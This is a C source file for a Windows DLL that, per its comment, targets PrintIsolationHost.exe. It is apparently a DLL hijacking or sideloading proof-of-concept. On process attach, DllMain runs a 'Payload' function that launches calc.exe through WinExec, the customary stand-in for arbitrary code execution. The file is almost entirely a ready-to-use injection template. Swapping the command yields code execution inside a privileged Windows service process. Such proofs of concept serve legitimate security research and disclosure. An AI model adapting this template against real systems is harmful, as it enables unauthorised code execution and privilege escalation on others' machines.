#include <Windows.h>
#pragma comment(lib, "user32.lib")

// Utilized for PrintIsolationHost.exe
// No other exports needed
VOID Payload()
{

	LPCSTR Cmd = "C:\\Windows\\System32\\calc.exe";

	WinExec(Cmd, 0);

}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID p)
{

	switch (r)
	{
	case DLL_PROCESS_ATTACH:
		Payload();
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;

	default:
		break;
	}

	return TRUE;

}